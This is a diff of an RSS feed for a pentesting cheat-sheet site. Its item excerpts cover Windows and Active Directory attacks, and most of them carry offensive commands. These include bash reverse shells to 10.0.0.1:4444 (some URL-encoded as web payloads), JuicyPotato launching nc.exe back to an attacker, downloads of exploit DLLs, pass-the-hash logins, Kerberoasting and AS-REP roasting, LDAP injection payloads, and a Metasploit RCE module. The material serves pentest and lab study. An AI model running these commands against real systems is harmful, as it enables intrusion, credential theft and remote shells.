@@ -16,11 +16,25 @@
       <description>It can be downloaded from here.&#xA;For listening from remote connection, run the following command.&#xA;pwncat-cs -lp 4444 # For Windows target pwncat-cs -m windows -lp 4444 Commands linkAfter reverse connecting, we can execute commands either local or remote.&#xA;# Switch between Local and Remote shell Ctrl&amp;#43;D # Upload a file to target machine (e.g. upload example.txt from local to remote) (local) upload ./example.txt /tmp/example.txt </description>
     </item>
     <item>
-      <title>Windows Privilege Escalation</title>
-      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/</link>
-      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/</guid>
-      <description>Automation linkWe might be able to find vulnerabilities on target Windows machine with automation tools as below:&#xA;WinPEAS wesng (Windows Exploit Suggester Next Generation) PrivescCheck LOLBAS (Living Off the Land Binaries, Scripts and Libraries) linkLOLBAS provides misuses tools and executables already in the Windows system. So check the website.&#xA;OS Information link hostname systeminfo systeminfo | findstr &amp;#34;OS&amp;#34; ver [System.Environment]::OSVersion.Version # Datetime Get-Date Interesting Information link # Current user whoami whoami /user whoami /groups whoami /priv whoami /all echo %username% # List users net user net users net user USERNAME Get-LocalUser # List groups net group net localgroup # List users in specific group net localgroup &amp;#34;Remote Management Users&amp;#34; # List user home directories Get-ChildItem C:\Users -Force # Network ipconfig ipconfig /all route print arp -A Get-NetAdapter # Firewall netsh firewall show state netsh firewall show config netsh advfirewall show allprofiles # PowerShell info Get-Host $Host $PSVersionTable # Display only the PowerShell version.</description>
+      <title>AS-REP Roasting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/as-rep-roasting/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/as-rep-roasting/</guid>
+      <description>Enumeration linkLists users and passwords is not required Kerberos pre auth. Used for ASREPRoasting.&#xA;impacket-GetNPUsers -dc-ip &amp;lt;target-ip&amp;gt; example.local/ -no-pass -usersfile users.txt impacket-GetNPUsers -dc-ip &amp;lt;target-ip&amp;gt; example.local/&amp;lt;username&amp;gt; -no-pass -format hashcat # Without authenticatino netexec ldap &amp;lt;target-ip&amp;gt; -u users.txt -p &amp;#39;&amp;#39; --asreproast output.txt # With authentication netexec ldap &amp;lt;target-ip&amp;gt; -u username -p password --asreproast output.txt If we find a password hash, crack it.&#xA;john --format=krb5asrep --wordlist=wordlist.txt hash.txt # or hashcat -m 18200 -a 0 hash.</description>
+    </item>
+    <item>
+      <title>Kerberoasting Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberoasting-attack/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberoasting-attack/</guid>
+      <description>Attack linkIf we have a password hash of a user, we might be able to find another user credential using the hash.&#xA;impacket-GetUserSPNs -hashes &amp;lt;lmhash&amp;gt;:&amp;lt;nthash&amp;gt; example.local/username -outputfile hashes.txt # Without pre-authentication # -no-preauth: https://github.com/SecureAuthCorp/impacket/pull/1413 impacket-GetUserSPNs -no-preauth username -usersfile users.txt -dc-host &amp;lt;ip-or-host&amp;gt; example.local/ netexec ldap &amp;lt;target-ip&amp;gt; -u username -p password --kerberoasting output.txt netexec ldap &amp;lt;target-ip&amp;gt; -u &amp;#39;&amp;#39; -p &amp;#39;&amp;#39; --kerberoasting output.txt After finding hashes, we can crack it or use for pass-the-hash attack.</description>
+    </item>
+    <item>
+      <title>LDAP (Lightweight Directory Access Protocol) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-pentesting/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-pentesting/</guid>
+      <description>Enumeration link # Nmap nmap --script ldap-brute --script-args ldap.base=&amp;#39;&amp;#34;cn=users,dc=cqure,dc=net&amp;#34;&amp;#39; -p 389 &amp;lt;target-ip&amp;gt; nmap --script ldap-search -p 389 &amp;lt;target-ip&amp;gt; nmap --script ldap-* -p 389 &amp;lt;target-ip&amp;gt; nmap --script &amp;#34;ldap* and not brute&amp;#34; -p 389 &amp;lt;target-ip&amp;gt; # NetExec # -k: Use Kerberos authentication netexec ldap &amp;lt;target-ip&amp;gt; -u usernames.txt -p &amp;#39;&amp;#39; -k # --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION` # reference: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties#property-flag-descriptions netexec ldap &amp;lt;target-ip&amp;gt; -u username -p password --trusted-for-delegation Search LDAP linkBelows are defined in LDAP.</description>
     </item>
     <item>
       <title>MSSQL (Microsoft SQL) Pentesting</title>
@@ -37,11 +51,39 @@
       <description>Setup Listener linkFirst of all, we need to start a listener in local machine to get an incoming connection.&#xA;nc -lvnp 4444 # For more elegant shell, use `rlwrap`. # https://github.com/hanslub42/rlwrap rlwrap nc -lvnp 4444 Online Generator link Reverse Shell Generator Bash link bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; /bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; # For URL param /?q=bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261 /?q=`bash&amp;#43;-c&amp;#43;&amp;#39;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261&amp;#39;` with Base64 linkExecute the following commands in target machine.</description>
     </item>
     <item>
-      <title>Active Directory Pentesting</title>
-      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/</link>
-      <pubDate>Wed, 15 Nov 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/</guid>
-      <description>Enumeration link # Domain Controllers (DNS) discovery dig @&amp;lt;target-ip&amp;gt; &amp;lt;domain-name&amp;gt; any ffuf -u https://FUZZ.example.com -w subdomains.txt -mc 200,301,302,403 gobuster dns -d example.local -w subdomains.txt -t 25 Using BloodHound linkReference: BloodHound&#xA;# https://github.com/dirkjanm/BloodHound.py bloodhound-python -d example.local -dc example.local -ns &amp;lt;nameserver-ip&amp;gt; -u &amp;#39;username@example.local&amp;#39; -p &amp;#39;password&amp;#39; # https://github.com/NH-RED-TEAM/RustHound.git rusthound -d example.local -u &amp;#39;usrname@example.local&amp;#39; -p &amp;#39;password&amp;#39; -i 10.0.0.1 --zip # --ldaps: Force LDAPS rusthound -d example.local -u &amp;#39;usrname@example.local&amp;#39; -p &amp;#39;password&amp;#39; -i 10.0.0.1 --zip --ldaps Automation link Seatbelt Investigation link # List all users net user /domain net user &amp;lt;username&amp;gt; /domain Get-ADUser -Filter * Get-ADUser -Identity &amp;lt;username&amp;gt; -Server dc.</description>
+      <title>Shadow Credentials</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/shadow-credentials/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/shadow-credentials/</guid>
+      <description>Exploit linkIf the attacker can modify the target object&amp;rsquo;s (user or computer account) attribute msDS-KeyCredentialLink and append it with alternate credentials in the form of certificates, he takes over the account in AD.&#xA;Using Certipy link # -k: Use Kerberos authentication certipy shadow auto -account &amp;#34;targetuser&amp;#34; -u &amp;#34;username@example.local&amp;#34; -p &amp;#39;password&amp;#39; -dc-ip 10.0.0.1 -target dc.example.local -k Using Whisker linkWhisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute.</description>
+    </item>
+    <item>
+      <title>SMB (Server Message Block) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/smb-pentesting/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/smb-pentesting/</guid>
+      <description>Enumeration linkTo enumerate automatically, we can use various tools such as nmap, smbclient, and so on&#xA;nmap --script smb-brute -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-enum* -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-protocols -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-vuln* -p 445 &amp;lt;target-ip&amp;gt; # NetBIOS names nmblookup -A 10.0.0.1 nbtscan 10.0.0.1 # Enum4linux enum4linux &amp;lt;target-ip&amp;gt; # All enumeration enum4linux -a &amp;lt;target-ip&amp;gt; # Verbose enum4linux -v &amp;lt;target-ip&amp;gt; # Specify username and password enum4linux -u username -p password &amp;lt;target-ip&amp;gt; # Enum4linux-ng # -A: All simple enumeration including nmblookup enum4linux-ng -A &amp;lt;target-ip&amp;gt; # -As: All simple short enumeration without NetBIOS names lookup enum4linux-ng -As &amp;lt;target-ip&amp;gt; # -u: Specific username # -p: Specific password enum4linux-ng -u &amp;#34;administrator&amp;#34; -p &amp;#34;password&amp;#34; &amp;lt;target-ip&amp;gt; # NetExec (https://www.</description>
+    </item>
+    <item>
+      <title>UAC Windows Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/uac-windows-privilege-escalation/</link>
+      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/uac-windows-privilege-escalation/</guid>
+      <description>Automation linkUACME is an automation tool for defeating Windows UAC.&#xA;Investigation link # Check the current user&amp;#39;s integrity level whoami /groups | findstr &amp;#34;Label&amp;#34; whoami /groups | find &amp;#34;Label&amp;#34; UAC Bypass linkAZMAN.MSC (Authorization Manager) link Open AZMAN.MSC by entering “azman.msc” in the Run. Click Help and select Help Topics. The MMC window will open. In the MMC window, right-click and select View Source. The Notepad opens. In the Notepad, select File → Open.</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with Registry Keys</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-registry-keys/</link>
+      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-registry-keys/</guid>
+      <description>Investigation linkFind interesting registry or values in registry keys.&#xA;# HKLM: HKEY_LOCAL_MACHINE reg query HKLM reg query HKLM\SAM reg query HKLM\SAM\SAM reg query HKLM\SECURITY reg query HKLM\SOFTWARE reg query HKLM\SYSTEM # Find user credentials reg query “HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon” # HKU: HKEY_USERS reg query HKU reg query HKU\S-1-2-3 # HKCU: HKEY_CURRENT_USER reg query HKCU reg query HKCU\System Reveal Password from Registry Hives linkA hive is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in.</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with SeBackupPrivilege</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</link>
+      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</guid>
+      <description>Investigation linkFirst check if the current user has SeBackupPrivilege in the privilege information.&#xA;whoami /all If so, we can read arbitrary files on the system include administrator&amp;rsquo;s files, SAML file, SYSTEM registry file, etc.&#xA;Exploitation (Read Sensitive Files) link1. Download &amp;amp; Upload Malicious DLLs linkIn local machine, download malicious dlls from here&#xA;# If powershell, Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeUtils.dll -OutFile .\SeBackupPrivilegeUtils.dll Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeCmdLets.dll -OutFile .\SeBackupPrivilegeCmdLets.dll # If winrm, upload SeBackupPrivilegeUtils.dll upload SeBackupPrivilegeCmdLets.</description>
     </item>
     <item>
       <title>Download Files in Windows</title>
@@ -51,11 +93,39 @@
       <description>Using Invoke-WebRequest linkWe can use Invoke-WebRequest command&#xA;# In PowerShell Invoke-WebRequest -Uri https://example.com/hello.txt -Outfile .\hello.txt IWR -Uri https://example.com/hello.txt -Outfile .\hello.txt # In CMD, we need to call `powershell` or `powershell.exe` command. powershell Invoke-WebRequest -Uri https://example.com/hello.txt -Outfile .\hello.txt powershlel IWR -Uri https://example.com/hello.txt -Outfile .\hello.txt </description>
     </item>
     <item>
+      <title>Login Windows Shell</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/login-windows-shell/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/login-windows-shell/</guid>
+      <description>Impacket PsExec linkPsExec gives us an interactive shell on the Windows host.&#xA;impacket-psexec username:password@&amp;lt;target-ip&amp;gt; # Pass the Hashes impacket-psexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d username@10.0.0.1 Impacket WmiExec linkWmiExec uses Windows Management Instrumentation (WMI) to give us an interactive shell on the Windows host.&#xA;impacket-wmiexec example.local/username@10.0.0.1 # Pass the Hashes impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1 </description>
+    </item>
+    <item>
       <title>PE (Portable Executable) Analysis</title>
       <link>https://documentnation.github.io/docs/hdks/reverse-engineering/pe-analysis/</link>
       <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/reverse-engineering/pe-analysis/</guid>
       <description>Investigation link file example.exe strings example.exe PE Headers linkThere are many tools to analyze PE headers, such as wxHexEditor, pe-tree.&#xA;pe-tree is a tool that views PE files in a tree-view. It will take about a few minutes to open.&#xA;pe-tree ./executable Structure Description IMAGE_DOS_HEADER It consists of the first 64 bytes of the PE file. The first two bytes (”4D 5A”) means the “MZ” characters which are an identity of the Portable Executable format.</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with AD CS</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-adcs/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-adcs/</guid>
+      <description>⚠️DISCLAIMER: I still don&amp;rsquo;t really understand AD CS, so it might be wrong. If so, please let me know via GitHub Issue or Pull Request.&#xA;Enumerate Certificate Templates linkCertificate templates are the rule set for AD CS. It contains CA name, CA permissions, etc. Some attributes are related to vulnerabilities to privilege escalation.&#xA;To enumerate them, we can use Certify or Certipy.&#xA;certipy find -u user@example.local -p password -dc-ip &amp;lt;target-ip&amp;gt; -stdout certipy find -vulnerable -u user@example.</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with RemotePotato</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-remotepotato/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-remotepotato/</guid>
+      <description>Exploit linkReference: RemotePotato0&#xA;According to the RemotePotato0&amp;rsquo;s README, it abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user).&#xA;We can download the executable from https://github.com/antonioCoco/RemotePotato0.&#xA;Module 0 (-m 0: Rpc2Http cross protocol relay server + potato trigger) link # In attack machine sudo socat tcp-listen:135,fork,reuseaddr tcp:&amp;lt;target-ip&amp;gt;:9999 &amp;amp; sudo ntlmrelayx.</description>
+    </item>
+    <item>
+      <title>Kerberos Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberos-pentesting/</link>
+      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberos-pentesting/</guid>
+      <description>Enumeration linkTo enumerate automatically, you can use nmap.&#xA;nmap --script krb5-enum-users --script-args krb5-enum-users.realm=&amp;#39;example.local&amp;#39;-p 88 &amp;lt;target-ip&amp;gt; Brute Force Authentication linkKerbrute is a tool to perform Kerberos pre-auth bruteforcing.&#xA;The wordlist (e.g. combos.txt) specified must be the &amp;ldquo;username:password&amp;rdquo; combinations.&#xA;# -v: verbose mode *it&amp;#39;s recommended to add this flag otherwise we cannot confirm if the user exist or not. # --dc: domain controller # -d: domain # combos.txt: the wordlist specified must be combinations with &amp;#34;username:password&amp;#34;.</description>
     </item>
     <item>
       <title>MSRPC (Microsoft Remote Procedure Call) Pentesting</title>
@@ -65,6 +135,48 @@
       <description>Enumeration link nmap --script msrpc-enum -p 135 &amp;lt;target-ip&amp;gt; # rpcdump for dumping RPC endpoints impacket-rpcdump -port 135 &amp;lt;target-ip&amp;gt; # Find the Print System Remote Prototol or the Print System Asynchronous Remote Protocol impacket-rpcdump -port 135 &amp;lt;target-ip&amp;gt; | grep -E &amp;#39;MS-RPRN|MS-PAR&amp;#39; If we found MS-RPRN or MS-PAR, we might be able to exploit with PrintNightmare.&#xA;Metasploit link msfconsole msf&amp;gt; use auxiliary/scanner/dcerpc/endpoint_mapper msf&amp;gt; use auxiliary/scanner/dcerpc/hidden msf&amp;gt; use auxiliary/scanner/dcerpc/management msf&amp;gt; use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor Investigation linkrpcinfo reports RPC information.</description>
     </item>
     <item>
+      <title>Windows PrivEsc with LocalPotato</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-localpotato/</link>
+      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-localpotato/</guid>
+      <description>GodPotato linkRequired Privileges link SeImpersonatePrivilege Payloads link https://github.com/BeichenDream/GodPotato GodPotato -cmd &amp;#34;cmd /c whoami&amp;#34; JuicyPotato linkRequired Privilege link SeImpersonatePrivilege or SeAssignPrimaryToken Payloads link https://github.com/antonioCoco/JuicyPotatoNG https://github.com/ohpe/juicy-potato Before exploiting, we need to upload nc.exe (it is available from here) to the target machine.&#xA;Invoke-WebRequest -Uri http://10.0.0.1:8000/nc.exe -OutFile c:\Temp\nc.exe Next start a listener in local machine.&#xA;nc -lvnp 4444 Then execute JuicyPotato in target machine.&#xA;JuicyPotatoNG.exe -t * -p &amp;#34;c:\Temp\nc.exe&amp;#34; -a &amp;#34;10.0.0.1 4444 -e cmd.</description>
+    </item>
+    <item>
+      <title>AD CS (Active Directory Certificate Services) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ad-cs-pentesting/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ad-cs-pentesting/</guid>
+      <description>Enumeration linkWe can retrieve certificates information on target Windows machine using certutil.&#xA;# Dump general information certutil -dump # Dump information about certificate authority certutil -ca certutil -catemplates # List all templates certutil -template # specify the template certutil -template ExampleTemplate Then check if Allow Full Control or Allow Write include the group which current user belongs to. If so, we can modify the template and might be able to escalate privilege.</description>
+    </item>
+    <item>
+      <title>BloodHound SharpHound for Active Directory</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/bloodhound-sharphound/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/bloodhound-sharphound/</guid>
+      <description>Enumerate Active Directory link1. Collect Information with Sharphound linkIn target machine, download SharpHound and run.&#xA;# Enumerate the AD information that can be visualized in Bloodhound Sharphound.exe --CollectionMethods All --Domain dc.example.com --ExcludeDCs Then the zip file will be generated. This file can be displayed in Bloodhound.&#xA;To transfer the zip file to local machine, run the following command in local machine.&#xA;scp &amp;lt;ad_username&amp;gt;@example.com:C:/Path/To/&amp;lt;sharphound_result&amp;gt;.zip . 2. Start Bloodhound linkIn local machine, start neo4j console.</description>
+    </item>
+    <item>
+      <title>DACL (Discretionary Access Control List) Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/dacl-attack/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/dacl-attack/</guid>
+      <description>Add Rights linkWe may be able to take a full control of securable objects by getting GenericAll permission on OU (Organizational Unit).&#xA;1. Ask TGT for Kerberos Authentication linkIf we want to use Kerberos authentication for attacking DACL, we need to retrieve a TGT for specific user at first. In addition, to avoid authentication error, we need to synchronize the system time with the domain controller using ntpdate or rdate.</description>
+    </item>
+    <item>
+      <title>RBCD (Resource-Based Constrained Delegation) Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/pbcd-attack/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/pbcd-attack/</guid>
+      <description>Exploit linkReference: https://github.com/tothi/rbcd-attack#abusing-kerberos-resource-based-constrained-delegation&#xA;0. Prerequisites linkTo achieve this attack successfully, we need the following conditions:&#xA;A domain account who has permission to write the computer (msDS-AllowedToActOnBehalfOfOtherIdentity property of the domain object). A domain account who has permission to create a new computer. LDAP (389) and SAMR (445) or LDAPS (636) access to the DC. Kerberos (88) access to the DC. 1. Create Fake Computer link impacket-addcomputer -computer-name &amp;#39;fakecomputer$&amp;#39; -computer-pass &amp;#39;password&amp;#39; -dc-ip 10.</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with Kerberos</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-kerberos/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-kerberos/</guid>
+      <description>Privilege Escalation linkFirst off, download two PS scripts in local machine..&#xA;wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1 Then upload them to the target machine.&#xA;# Evil-WinRM upload PowerView.ps1 Import-Module .\PowerView.ps1 upload Powermad.ps1 Import-Module .\Powermad.ps1 1. Check User&amp;rsquo;s Permission and Windows Versions linkCheck if users are allowed to create a new computer object on the domain.&#xA;Get-DomainObject -Identity &amp;#34;dc=example,dc=com&amp;#34; -Domain example.com # ------------------------- # Result ms-ds-machineaccountquota: 10 And check if the machine is at least Windows Server 2012.</description>
+    </item>
+    <item>
       <title>WinRM (Windows Remote Management) Pentesting</title>
       <link>https://documentnation.github.io/docs/hdks/windows/protocol/winrm-pentesting/</link>
       <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
@@ -72,11 +184,32 @@
       <description>Enumeration linkBrute Force Credentials link # CrackMapExec poetry run crackmapexec winrm &amp;lt;target-ip&amp;gt; -d DomainName -u usernames.txt -p passwords.txt # Metasploit msfconsole msf &amp;gt; use auxiliary/scanner/winrm/winrm_login Evil-WinRM linkEvil-WinRM is a Windows Remote Management shell for pentesting.&#xA;Below are list of commands for each situation.&#xA;Connect link evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password # -P: Specifify port evil-winrm -i &amp;lt;target-ip&amp;gt; -P 5986 -u username -p password # Pass The Hash (-H) evil-winrm -i &amp;lt;target-ip&amp;gt; -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc # PowerShell Local Path (-s) evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password -s /opt/scripts # SSL enabled (-S) evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password -S If you have private key and public key, you can use them for authentication.</description>
     </item>
     <item>
+      <title>LDAP Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-injection/</link>
+      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-injection/</guid>
+      <description>Basic Payloads link (&amp;amp;uid=*)(userPassword=*) (&amp;amp;uid=*)|(userPassword=*) (&amp;amp;uid=*)|(objectClass=*)(userPassword=password123) *)(uid=*))(|(password=*) </description>
+    </item>
+    <item>
       <title>M365 (Microsoft Office 365) Pentesting</title>
       <link>https://documentnation.github.io/docs/hdks/windows/service/m365-pentesting/</link>
       <pubDate>Sat, 09 Sep 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/windows/service/m365-pentesting/</guid>
       <description>Enumeration linkPassword Spraying linkWe may spray user passwords with open-source tools as below.&#xA;MFASweap o365spray </description>
+    </item>
+    <item>
+      <title>Windows Memory Dump Analysis</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/forensics/windows-memory-dump-analysis/</link>
+      <pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/forensics/windows-memory-dump-analysis/</guid>
+      <description>Investigation link file example.dmp # Output example.dmp: Mini DuMP crash report, 18 streams, Sat Nov ... Static Analysis linkWe can also read contents of this file by usual static analysis such as below.&#xA;strings example.dmp strings example.dmp | grep -i password # Open pager strings example.dmp | less xxd example.dmp Using Debugger link IDA, ILSpy Visual Studio Using Online Viewer linkThis file can also be read with online DMP viewer.</description>
+    </item>
+    <item>
+      <title>Reading OneDrive Logs</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/forensics/reading-onedrive-logs/</link>
+      <pubDate>Fri, 18 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/forensics/reading-onedrive-logs/</guid>
+      <description>Deobfuscating Log Files linkTo read OneDrive logs, we need to deobfuscate log files (.odl, .odlsent, .odlgz).&#xA;These logs are located in the following on Windows:&#xA;C:\Users\&amp;lt;username&amp;gt;\AppData\Local\Microsoft\OneDrive\logs\Personal\ C:\Users\&amp;lt;username&amp;gt;\AppData\Local\Microsoft\OneDrive\logs\Business1\ This repository is useful to deobfuscate OneDrive logs.&#xA;python -m venv venv # on Windows .\venv\Scripts\activate pip install construct pycryptodome python odl.py -o .\output.csv c:\Users\\AppData\Local\Microsoft\OneDrive\logs\Personal\ After that, we can read the output file (output.csv) with tools such as VS Code and Excel.&#xA;This file contains sensitive information such as OneDrive account email, access token, etc.</description>
     </item>
     <item>
       <title>Malware Detection on Windows</title>
@@ -107,11 +240,25 @@
       <description>Interesting Files link cat /etc/wsl.conf Escape WSL to Windows Host Machine linkIf we’are currently on WSL machine, we can access to the host Windows machine as below.&#xA;cd /mnt/c/ If /mnt/c/ is empty, we need to mount the folder by running the following command.&#xA;cd / # -t: Limit the set of filesystem types # drvfs: A plugin for WSL # C: : Specify the Windows root mount -t drvfs C: /mnt/c </description>
     </item>
     <item>
-      <title>Windows Forensics</title>
-      <link>https://documentnation.github.io/docs/hdks/windows/forensics/</link>
-      <pubDate>Tue, 04 Apr 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/windows/forensics/</guid>
-      <description>System Information linkIP Address &amp;amp; MAC Address linkBelow are the location of the file which contains the information of IP address and MAC address.&#xA;# Look@LAN is a network monitoring tool. So if the system uses the tool, we can retrieve the information of the network. # LANIP -&amp;gt; IP address # LANNIC -&amp;gt; MAC address c:\Program Files (x86)\Look@LAN\irunin.ini Network Cards linkThe name of the network card is such like “Intel(R) PRO/1000 MT Desktop Adapter”.</description>
+      <title>ManageEngine ADSelfService Plus PrivEsc</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/manageengine-adselfservice-plus/</link>
+      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/manageengine-adselfservice-plus/</guid>
+      <description>Directories link dir -Force \Program Files (x86)\ManageEngine\ADSelfService Plus\ Unauthenticated SAML RCE (CVE-2022-47966) linkReference: https://www.rapid7.com/db/modules/exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966/&#xA;msfconsole msf&amp;gt; use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966 msf&amp;gt; set GUID 43ae36f51da65753530a64b37a510a53 msf&amp;gt; set ISSUER_URL http://example.com/adfs/services/trust msf&amp;gt; set RHOSTS &amp;lt;target-ip&amp;gt; msf&amp;gt; set RPORT 9251 msf&amp;gt; set LHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; set LPORT 4444 msf&amp;gt; run meterpreter&amp;gt; shell </description>
+    </item>
+    <item>
+      <title>Outlook Reminder Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/outlook-reminder-privilege-escalation/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/outlook-reminder-privilege-escalation/</guid>
